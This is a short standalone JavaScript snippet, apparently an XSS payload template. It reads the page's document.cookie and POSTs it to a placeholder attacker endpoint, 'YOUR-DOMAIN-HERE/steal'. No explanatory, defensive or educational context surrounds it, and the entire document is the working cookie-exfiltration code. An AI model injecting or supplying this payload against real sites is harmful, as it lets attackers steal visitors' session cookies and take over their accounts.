(function() {
    const cookies = document.cookie;

    fetch('https://YOUR-DOMAIN-HERE/steal', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'cookies=' + encodeURIComponent(cookies)
    });
})();